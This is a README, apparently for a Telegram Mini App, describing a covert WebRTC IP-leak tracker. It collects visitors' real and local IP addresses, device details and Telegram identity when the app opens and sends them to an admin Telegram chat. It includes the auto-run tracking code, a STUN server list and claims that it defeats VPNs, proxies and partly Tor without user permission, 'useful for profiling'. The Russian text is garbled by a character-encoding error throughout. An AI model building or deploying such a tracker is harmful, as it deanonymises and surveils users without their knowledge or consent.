# WebRTC IP Leak Detection System

## üéØ –û–ø–∏—Å–∞–Ω–∏–µ

–°–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∞ IP-–∞–¥—Ä–µ—Å–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —á–µ—Ä–µ–∑ WebRTC leak —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö STUN —Å–µ—Ä–≤–µ—Ä–æ–≤ –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ–∫—Ä—ã—Ç–∏—è –∏ —Ç–æ—á–Ω–æ—Å—Ç–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ä–µ–∞–ª—å–Ω—ã—Ö IP-–∞–¥—Ä–µ—Å–æ–≤.

## üîß –ö–æ–º–ø–æ–Ω–µ–Ω—Ç—ã —Å–∏—Å—Ç–µ–º—ã

### 1. `/utils/webrtc-ip.ts`
–û—Å–Ω–æ–≤–Ω–æ–π –º–æ–¥—É–ª—å –¥–ª—è —Å–±–æ—Ä–∞ IP-–∞–¥—Ä–µ—Å–æ–≤ —á–µ—Ä–µ–∑ WebRTC:
- **12 STUN —Å–µ—Ä–≤–µ—Ä–æ–≤** –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ –ø–æ–∫—Ä—ã—Ç–∏—è
- –°–±–æ—Ä IPv4, IPv6 –∏ –ª–æ–∫–∞–ª—å–Ω—ã—Ö IP-–∞–¥—Ä–µ—Å–æ–≤
- Fallback –Ω–∞ –≤–Ω–µ—à–Ω–∏–µ API (ipify, my-ip.io, ipapi.co)
- –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è
- –¢–∞–π–º–∞—É—Ç 3 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è WebRTC + 2 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è API

### 2. `/utils/telegram-bot.ts`
–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ Telegram –±–æ—Ç–∞:
- –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö —Å —ç–º–æ–¥–∑–∏
- Retry –º–µ—Ö–∞–Ω–∏–∑–º (3 –ø–æ–ø—ã—Ç–∫–∏)
- –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤—Å–µ—Ö leaked IP –∞–¥—Ä–µ—Å–æ–≤
- –û—Ç–ø—Ä–∞–≤–∫–∞ –∞–¥–º–∏–Ω—É (chat_id: 7320458296)

### 3. `/utils/test-webrtc.ts`
–¢–µ—Å—Ç–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–±–æ—Ç—ã:
- `testWebRTC()` - –ø–æ–ª–Ω—ã–π —Ç–µ—Å—Ç —Å –æ—Ç–ø—Ä–∞–≤–∫–æ–π –≤ Telegram
- `quickTestWebRTC()` - –±—ã—Å—Ç—Ä—ã–π —Ç–µ—Å—Ç —Ç–æ–ª—å–∫–æ WebRTC leak

## üìä –ö–∞–∫–∏–µ –¥–∞–Ω–Ω—ã–µ —Å–æ–±–∏—Ä–∞—é—Ç—Å—è

### IP-–∞–¥—Ä–µ—Å–∞:
- **webrtcLeaked[]** - –≤—Å–µ IP –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ WebRTC leak
- **ipv4[]** - –ø—É–±–ª–∏—á–Ω—ã–µ IPv4 –∞–¥—Ä–µ—Å–∞
- **ipv6[]** - –ø—É–±–ª–∏—á–Ω—ã–µ IPv6 –∞–¥—Ä–µ—Å–∞
- **localIP[]** - –ª–æ–∫–∞–ª—å–Ω—ã–µ IP –∞–¥—Ä–µ—Å–∞ (192.168.x.x, 10.x.x.x, 172.x.x.x)

### –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:
- User Agent (–±—Ä–∞—É–∑–µ—Ä, –û–°, —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ)
- –Ø–∑—ã–∫ –±—Ä–∞—É–∑–µ—Ä–∞
- –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ (Win32, Linux, MacIntel –∏ —Ç.–¥.)
- –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
- Timezone
- Timestamp
- Telegram User (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–µ–Ω)

## üöÄ –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç

### –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ:
```typescript
// –í App.tsx - –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
useEffect(() => {
  const trackUser = async () => {
    const { ip, ipInfo } = await getIPFast();
    const userInfo = getUserInfo();
    
    await sendUserDataToBot({
      ip,
      ipInfo,
      ...userInfo,
      telegramUser
    });
  };
  
  trackUser(); // –ù–µ–±–ª–æ–∫–∏—Ä—É—é—â–µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
}, []);
```

### STUN —Å–µ—Ä–≤–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –¥–ª—è leak:
```javascript
const STUN_SERVERS = [
  'stun:stun.l.google.com:19302',
  'stun:stun1.l.google.com:19302',
  'stun:stun2.l.google.com:19302',
  'stun:stun3.l.google.com:19302',
  'stun:stun4.l.google.com:19302',
  'stun:23.21.150.121:3478',
  'stun:iphone-stun.strato-iphone.de:3478',
  'stun:numb.viagenie.ca:3478',
  'stun:s1.taraba.net:3478',
  'stun:s2.taraba.net:3478',
  'stun:stun.12connect.com:3478',
  'stun:stun.12voip.com:3478'
];
```

## üß™ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ

### –í –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞:

#### –ë—ã—Å—Ç—Ä—ã–π —Ç–µ—Å—Ç (—Ç–æ–ª—å–∫–æ WebRTC leak):
```javascript
quickTestWebRTC()
```

–í—ã–≤–æ–¥:
```
‚ö° –ë—ã—Å—Ç—Ä—ã–π —Ç–µ—Å—Ç WebRTC leak...

üìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã:
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üîì WebRTC Leaked IPs (3):
   1. 192.168.1.100
   2. 93.175.123.45
   3. fe80::1234:5678:abcd:ef01

üìç –ü—É–±–ª–∏—á–Ω—ã–µ IPv4 (1):
   ‚Ä¢ 93.175.123.45

üè† –õ–æ–∫–∞–ª—å–Ω—ã–µ IP (1):
   ‚Ä¢ 192.168.1.100

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
```

#### –ü–æ–ª–Ω—ã–π —Ç–µ—Å—Ç (—Å –æ—Ç–ø—Ä–∞–≤–∫–æ–π –≤ Telegram):
```javascript
testWebRTC()
```

–í—ã–≤–æ–¥:
```
üß™ === –¢–ï–°–¢ WebRTC IP LEAK ===

üì° –¢–µ—Å—Ç 1: –ü—Ä—è–º–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ WebRTC...
‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç: { ipv4: [...], ipv6: [...], localIP: [...], webrtcLeaked: [...] }

‚ö° –¢–µ—Å—Ç 2: –ë—ã—Å—Ç—Ä–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ (WebRTC + API)...
‚úÖ Primary IP: 93.175.123.45
‚úÖ Full Info: { ... }

üë§ –¢–µ—Å—Ç 3: –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ...
‚úÖ User Info: { userAgent: "...", language: "ru-RU", ... }

‚è±Ô∏è –û–±—â–µ–µ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: 2534ms

üì§ –¢–µ—Å—Ç 4: –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram...
‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram!

üéâ === –¢–ï–°–¢ –ó–ê–í–ï–†–®–ï–ù ===
```

## üì± –°–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram

–ü—Ä–∏–º–µ—Ä —Å–æ–æ–±—â–µ–Ω–∏—è –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–∏—Ö–æ–¥–∏—Ç –∞–¥–º–∏–Ω—É:

```
üîî –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ Mini App

üåê IP –ê–¥—Ä–µ—Å: 93.175.123.45

üîì WebRTC Leak (3):
   1. 192.168.1.100
   2. 93.175.123.45
   3. fe80::1234:5678:abcd:ef01

üìç –ü—É–±–ª–∏—á–Ω—ã–µ IPv4:
   ‚Ä¢ 93.175.123.45

üè† –õ–æ–∫–∞–ª—å–Ω—ã–µ IP:
   ‚Ä¢ 192.168.1.100

üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: Win32
üåç –Ø–∑—ã–∫: ru-RU
üì∫ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: 1920x1080
üïê Timezone: Europe/Moscow
‚è∞ –í—Ä–µ–º—è: 2025-12-01T15:30:45.123Z

üë§ Telegram User:
   ID: 123456789
   Username: @username
   Name: John Doe

üîç User Agent:
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
```

## ‚ö° –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å

- **WebRTC leak**: ~2-3 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ—Ö IP
- **API fallback**: ~1-2 —Å–µ–∫—É–Ω–¥—ã
- **–û–±—â–µ–µ –≤—Ä–µ–º—è**: ~3-5 —Å–µ–∫—É–Ω–¥ –º–∞–∫—Å–∏–º—É–º
- **–ù–µ–±–ª–æ–∫–∏—Ä—É—é—â–µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ**: UI –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –º–≥–Ω–æ–≤–µ–Ω–Ω–æ, —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ–Ω–µ

## üîí –û–±—Ö–æ–¥ VPN –∏ Proxy

WebRTC leak –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —Ä–µ–∞–ª—å–Ω—ã–π IP –¥–∞–∂–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç:
- ‚úÖ VPN —Å–µ—Ä–≤–∏—Å—ã
- ‚úÖ Proxy —Å–µ—Ä–≤–µ—Ä—ã
- ‚úÖ Tor (—á–∞—Å—Ç–∏—á–Ω–æ)
- ‚ö†Ô∏è –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã (Brave, Firefox —Å –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏) –±–ª–æ–∫–∏—Ä—É—é—Ç WebRTC leak

## üõ†Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞

### –ò–∑–º–µ–Ω–∏—Ç—å admin chat ID:
–í —Ñ–∞–π–ª–µ `/utils/telegram-bot.ts`:
```typescript
const ADMIN_CHAT_ID = '7320458296'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID
```

### –î–æ–±–∞–≤–∏—Ç—å –±–æ–ª—å—à–µ STUN —Å–µ—Ä–≤–µ—Ä–æ–≤:
–í —Ñ–∞–π–ª–µ `/utils/webrtc-ip.ts`:
```typescript
const STUN_SERVERS = [
  // ... —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Å–µ—Ä–≤–µ—Ä—ã
  'stun:your-stun-server.com:3478',
];
```

## üìù –õ–æ–≥–∏ –≤ –∫–æ–Ω—Å–æ–ª–∏

–°–∏—Å—Ç–µ–º–∞ –≤—ã–≤–æ–¥–∏—Ç –¥–µ—Ç–∞–ª—å–Ω—ã–µ –ª–æ–≥–∏ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏:
- üöÄ –ù–∞—á–∞–ª–æ –ø–æ–ª—É—á–µ–Ω–∏—è IP
- üîç –ó–∞–ø—É—Å–∫ WebRTC leak detection
- üéØ –ö–∞–∂–¥—ã–π –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã–π IP
- ‚úÖ –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
- üì§ –ü–æ–ø—ã—Ç–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
- ‚ùå –û—à–∏–±–∫–∏ (–µ—Å–ª–∏ –µ—Å—Ç—å)

## üîç –ß—Ç–æ –∑–Ω–∞—á–∏—Ç "–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: Win32"?

`Win32` - —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ `navigator.platform`, –∫–æ—Ç–æ—Ä–æ–µ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É (Windows), –∞ –Ω–µ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–µ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ.

–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–ª–µ–µ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –Ω—É–∂–Ω–æ –ø–∞—Ä—Å–∏—Ç—å `navigator.userAgent`, –≥–¥–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ:
- –í–µ—Ä—Å–∏–∏ –û–° (Windows 10, Android 11, iOS 15)
- –ë—Ä–∞—É–∑–µ—Ä–µ (Chrome, Safari, Firefox)
- –ú–æ–¥–µ–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ (Samsung Galaxy S21, iPhone 13 - —Ç–æ–ª—å–∫–æ –Ω–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö)

## üéì –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

- WebRTC leak —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–µ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤
- –ù–µ —Ç—Ä–µ–±—É–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- –†–∞–±–æ—Ç–∞–µ—Ç –¥–∞–∂–µ –≤ incognito —Ä–µ–∂–∏–º–µ
- –û–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –∫–∞–∫ IPv4 —Ç–∞–∫ –∏ IPv6 –∞–¥—Ä–µ—Å–∞
- –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –ª–æ–∫–∞–ª—å–Ω—ã–µ IP –≤ —á–∞—Å—Ç–Ω—ã—Ö —Å–µ—Ç—è—Ö (–ø–æ–ª–µ–∑–Ω–æ –¥–ª—è –ø—Ä–æ—Ñ–∏–ª–∏—Ä–æ–≤–∞–Ω–∏—è)
